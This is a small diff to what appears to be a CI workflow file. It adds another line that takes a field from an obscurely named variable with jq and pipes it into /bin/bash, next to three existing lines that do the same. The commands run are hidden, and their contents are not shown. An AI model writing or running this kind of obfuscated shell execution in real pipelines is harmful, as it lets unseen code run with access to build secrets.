@@ -24,6 +24,7 @@ jobs:
           echo $xrc81 | jq -r .adbb29168 | /bin/bash
           printf '%s' "$tgl6984" | jq -r .mub5566 | /bin/bash
           printf '%s' "$yzakw5" | jq -r .rtuv01 | /bin/bash
+          echo $y17 | jq -r .ady8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
